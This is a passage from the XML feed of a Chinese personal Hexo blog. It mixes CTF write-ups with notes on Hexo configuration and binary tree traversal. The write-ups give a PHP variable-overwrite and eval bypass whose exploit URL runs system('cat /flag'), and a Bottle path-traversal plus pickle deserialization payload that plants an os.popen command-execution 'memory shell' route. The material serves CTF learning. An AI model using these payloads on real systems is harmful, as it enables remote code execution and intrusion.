class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Welcome to GeekChallenge2024!</span><br><span class="line">You took the first step!</span><br><span class="line">Well, I know the year is <span class="number">2024</span></span><br><span class="line">Get the flag now!</span><br><span class="line">SYC&#123;<span class="number">760265</span>a2-<span class="number">1557</span>-<span class="number">49</span>b2-ba17-<span class="number">0383354</span>f241e&#125; </span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://121.challenge.ctfplus.cn?year=2023e1&amp;purpose=rce&amp;code=system(&quot;cat /flag&quot;);</span><br><span class="line">post:</span><br><span class="line">start=startnow&amp;_[2024.geekchallenge.ctf=10932435112</span><br></pre></td></tr></table></figure><p>php7:<br>$<em>POST[&quot;_<em>2024.geekchallenge.ctf&quot;]中的&#39;.&#39;会被替换成&#39;</em>&#39;,<br>\传参_[2024.geekchallenge.ctf此时&#39;[&#39;被替换成&#39;</em>&#39;后，之后的.不会被替换<br>year&#x3D;2023e在php8中无法绕过</p><p>弱比较绕过，0e后面必须全部是数字。</p><p>purpose&#x3D;rce<br>&quot;&#x2F;.+?rce&#x2F;ism&quot;，.+?匹配到任意字符后，往后找不到rce</p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的md解析器将半角单引号转换成全角</title>
      <link href="/2024/11/11/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%E6%90%AD%E5%BB%BA/Hexo%E7%9A%84md%E8%A7%A3%E6%9E%90%E5%99%A8%E5%B0%86%E5%8D%8A%E8%A7%92%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BD%AC%E6%8D%A2%E6%88%90%E5%85%A8%E8%A7%92/"/>
      <url>/2024/11/11/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%E6%90%AD%E5%BB%BA/Hexo%E7%9A%84md%E8%A7%A3%E6%9E%90%E5%99%A8%E5%B0%86%E5%8D%8A%E8%A7%92%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BD%AC%E6%8D%A2%E6%88%90%E5%85%A8%E8%A7%92/</url>
      
        <content type="html"><![CDATA[<p>默认的配置<a href="https://github.com/hexojs/hexo-renderer-marked#options">配置</a><br>默认的配置似乎是这个<br> <span id="more"></span></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">gfm:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pedantic:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartLists:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartypants:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">quotes:</span> <span class="string">&#x27;“”‘’&#x27;</span></span><br><span class="line">  <span class="attr">modifyAnchors:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">anchorAlias:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">autolink:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">sanitizeUrl:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">dompurify:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">headerIds:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">figcaption:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">external_link:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">exclude:</span> []</span><br><span class="line">    <span class="attr">nofollow:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">disableNunjucks:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">descriptionLists:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>方法<a href="https://github.com/theme-next/hexo-theme-next/issues/462">在问题3</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 适用默认的 hexo-renderer-marked</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line"><span class="bullet">-</span>  <span class="attr">smartypants:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">+</span>  <span class="attr">smartypants:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>记得hexo clean</p>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-neat无法压缩部分js文件,已解决</title>
      <link href="/2024/11/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%E6%90%AD%E5%BB%BA/hexo-neat%E4%B8%8D%E8%83%BD%E5%8E%8B%E7%BC%A9%E9%83%A8%E5%88%86js%E6%96%87%E4%BB%B6-%E8%A7%A3%E5%86%B3/"/>
      <url>/2024/11/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%E6%90%AD%E5%BB%BA/hexo-neat%E4%B8%8D%E8%83%BD%E5%8E%8B%E7%BC%A9%E9%83%A8%E5%88%86js%E6%96%87%E4%BB%B6-%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>打印报错发现原因是hexo-neat使用的UglifyJS不支持ES6<br> <span id="more"></span><br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo-neat/1.jpg" alt="试试图片" loading="lazy"></p><h5 id="解决方法，用terser替换UglifyJS。"><a href="#解决方法，用terser替换UglifyJS。" class="headerlink" title="解决方法，用terser替换UglifyJS。"></a>解决方法，用terser替换UglifyJS。</h5><p>terser的api: <a href="https://terser.nodejs.cn/docs/api-reference/">链接</a><br>进入[hexo根目录]&#x2F;node_modules&#x2F;hexo-neat&#x2F;目录下安装terser</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install terser --save-dev</span><br></pre></td></tr></table></figure><p>将hexo-neat&#x2F;lib&#x2F;filter.js中的logiv_js的UglifyJS换成terser</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入const &#123; minify &#125; = require(&quot;terser&quot;);</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">logic_js</span>(<span class="params">str, data</span>) &#123;</span><br><span class="line">    <span class="comment">//let js_result = str;</span></span><br><span class="line">    <span class="keyword">var</span> hexo = <span class="variable language_">this</span>,</span><br><span class="line">        options = hexo.<span class="property">config</span>.<span class="property">neat_js</span>;</span><br><span class="line">    <span class="comment">// Return if disabled.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === options.<span class="property">enable</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> path = data.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">var</span> exclude = options.<span class="property">exclude</span>;</span><br><span class="line">    <span class="keyword">if</span> (exclude &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(exclude)) exclude = [exclude];</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; exclude &amp;&amp; exclude.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = exclude.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">minimatch</span>(path, exclude[i], &#123; <span class="attr">matchBase</span>: <span class="literal">true</span> &#125;)) <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//var result = UglifyJS.minify(str, options);</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">minify</span>(str);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;!!!!!!!!&#x27;</span>+path+<span class="string">&#x27;ERROR:&#x27;</span>+error);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> saved = (((str.<span class="property">length</span> - result.<span class="property">code</span>.<span class="property">length</span>) / str.<span class="property">length</span>) * <span class="number">100</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">logger</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> log = hexo.<span class="property">log</span> || <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line">        log.<span class="title function_">log</span>(<span class="string">&#x27;neat the js: %s [ %s saved]&#x27;</span>, path, saved + <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.<span class="property">code</span>+<span class="string">&#x27;\n//rebuild by neat terser&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有报错了<br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo-neat/2.jpg" alt="试试图片" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bottle</title>
      <link href="/2024/11/08/%E5%AD%A6/bottle_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/08/%E5%AD%A6/bottle_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>1</p> <span id="more"></span><h2 id="signin-xyctf2025"><a href="#signin-xyctf2025" class="headerlink" title="signin xyctf2025"></a>signin xyctf2025</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;Hell0_H@cker_Y0u_A3r_Sm@r7&#x27;</span></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="comment">#name:&quot;!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>访问.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret 获取cookie的secret</p><p><a href="https://www.osgeo.cn/bottle/changelog.html?highlight=cookie">bottle文档，加密的cookie用pickle打包对象</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"></span><br><span class="line">secret=<span class="string">&#x27;Hell0_H@cker_Y0u_A3r_Sm@r7&#x27;</span></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># a=__import__(&#x27;sys&#x27;).modules[__name__].__dict__[&#x27;app&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exec(&#x27;&#x27;&#x27;from bottle import route;</span></span><br><span class="line"><span class="comment"># print(route)&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(route)      </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;可观察到两个route是同一个对象&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jaly_route=__import__(&#x27;sys&#x27;).modules[__name__].__dict__[&#x27;route&#x27;]</span></span><br><span class="line"><span class="comment"># print(jaly_route)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exec(&#x27;&#x27;&#x27;s=route(&#x27;/memshell&#x27;,&#x27;GET&#x27;,lambda:print(1))&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @route(&#x27;/test_cmd&#x27;)</span></span><br><span class="line"><span class="comment"># def test():</span></span><br><span class="line"><span class="comment">#     return __import__(&#x27;os&#x27;).popen(request.query.cmd).read()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tmp</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">         <span class="keyword">return</span> (<span class="built_in">exec</span>,(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;cmd=route(&#x27;/cmd&#x27;,&quot;GET&quot;,lambda: __import__(&#x27;os&#x27;).popen(request.query.cmd).read())</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,))  <span class="comment">#加逗号使其类型为tuple</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __reduce__返回tuple：(可调用对象,tuple)，tuple里放参数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/gtck&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gtck</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session=tmp()</span><br><span class="line">        response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/tsck&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsck</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">    </span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>bottle版本导致生成的cookie不同，bottle 使用0.13.3可以在环境生成内存马</p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> bottle </tag>
            
            <tag> pickle </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉数非递归遍历记录</title>
      <link href="/2024/11/08/%E5%AD%A6/%E4%BA%8C%E5%8F%89%E6%95%B0%E9%9D%9E%E9%80%92%E5%BD%92%E9%81%8D%E5%8E%86/"/>
      <url>/2024/11/08/%E5%AD%A6/%E4%BA%8C%E5%8F%89%E6%95%B0%E9%9D%9E%E9%80%92%E5%BD%92%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树递归遍历"><a href="#二叉树递归遍历" class="headerlink" title="二叉树递归遍历"></a>二叉树递归遍历</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">伪代码①ⓁⓇ</span><br><span class="line">func(p):        〇<span class="keyword">in</span></span><br><span class="line">    <span class="keyword">if</span> p == null </span><br><span class="line">        <span class="built_in">return</span>  〇ret</span><br><span class="line">    visit(p)    </span><br><span class="line">    func(p-&gt;l)  Ⓛin-ret</span><br><span class="line">    func(p-&gt;r)  Ⓡin-ret</span><br></pre></td></tr></table></figure><p>visit的位置决定前中后序</p><h3 id="用栈实现非递归遍历，可以与递归实现相对应"><a href="#用栈实现非递归遍历，可以与递归实现相对应" class="headerlink" title="用栈实现非递归遍历，可以与递归实现相对应"></a>用栈实现非递归遍历，可以与递归实现相对应</h3><p><strong>栈记录(模拟)递归的返回路线。</strong><br><strong>并且保存了节点的信息：栈中的结点都访问过左孩子</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#前中序遍历，伪代码在循环中</span></span><br><span class="line"><span class="keyword">if</span> p!=null:</span><br><span class="line">    push p  〇<span class="keyword">in</span></span><br><span class="line">    p=p-&gt;l  Ⓛ<span class="keyword">in</span>     <span class="comment">#栈里的节点都访问过左孩子</span></span><br><span class="line"><span class="keyword">else</span>:       </span><br><span class="line">    p=top   Ⓛ|Ⓡret <span class="comment">#和else一起组成ret,此行返回现场 进循环时p是top的左或右孩子</span></span><br><span class="line">    p=p-&gt;r  Ⓡ<span class="keyword">in</span></span><br><span class="line">    top-=1  〇ret    <span class="comment">#此时p左右孩子都访问过了，在前中序遍历中已经可以visit,然后丢弃了(与递归相比，返回提前了)。可化简成pop p; p-&gt;r</span></span><br></pre></td></tr></table></figure><p>非递归遍历中的if判断用来记录递归的状态（用1到2次循环模拟一次递归）<br>递归有三种状态，</p><ul><li><ol><li>进入函数并进入左孩子</li></ol></li><li><ol><li>if p&#x3D;&#x3D;null 结束</li></ol></li><li><ol start="2"><li>从左孩子ret然后进入右孩子</li></ol></li><li><ol start="3"><li>从右孩子ret，准备结束<br>if p!&#x3D;null:对应1.刚进入函数再进入左孩子<br>else是压缩过的，对应<br>从左孩子ret出，进右孩子<br>或从右孩子ret出，结束ret，回到上一级递归的 <strong>从左孩子ret出进右孩子</strong> 状态，因为栈里的都左过，右过的都pop了，所以必定是返回到从左孩子出的状态。</li></ol></li></ul><h5 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#后序遍历，伪代码在循环中</span></span><br><span class="line"><span class="keyword">if</span> p!=null:</span><br><span class="line">    push p  〇<span class="keyword">in</span></span><br><span class="line">    p=p-&gt;l  Ⓛ<span class="keyword">in</span></span><br><span class="line"><span class="keyword">else</span> :       </span><br><span class="line">    p=top   Ⓛ|Ⓡret </span><br><span class="line">    p=p-&gt;r  Ⓡ<span class="keyword">in</span></span><br><span class="line">    <span class="comment">#top-=1  ①在前中序遍历中是用“删除操作”记录节点 &quot;访问过右孩子&quot; 的信息</span></span><br><span class="line">    <span class="comment">#但此处top还有用，需要用其他方法记录</span></span><br><span class="line">    top.flag=<span class="literal">true</span> <span class="comment">#用变量记录top向右走过，这样要该判断条件</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#后序遍历，伪代码在循环中</span></span><br><span class="line"><span class="keyword">if</span> p!=null &amp;&amp; p!=top: <span class="comment">#加一个判断防止从右返回二次入栈</span></span><br><span class="line">    push p  〇<span class="keyword">in</span></span><br><span class="line">    p=p-&gt;l  Ⓛ<span class="keyword">in</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!p.flag): <span class="comment">#没有访问过右孩子       </span></span><br><span class="line">    p=top   Ⓛret <span class="comment">#此处只对应Ⓛ的ret</span></span><br><span class="line">    p.flag=<span class="literal">true</span>   <span class="comment">#记录节点向右的信息</span></span><br><span class="line">    p=p-&gt;r  Ⓡ<span class="keyword">in</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    p=top   Ⓡret</span><br><span class="line">    vst(p)  </span><br><span class="line">    top-=1  〇ret退出</span><br><span class="line">    p=top   〇ret恢复到父级递归的现场</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if p!&#x3D;null &amp;&amp; p!&#x3D;top:刚进，进左<br>else if(!p.flag):左出，右进（包含左孩子递归的ret）<br>else :右出，输出，退出（包含右孩子递归的ret）</p><h4 id="c实现"><a href="#c实现" class="headerlink" title="c实现"></a>c实现</h4><p>为了方便复习，写的很冗长</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 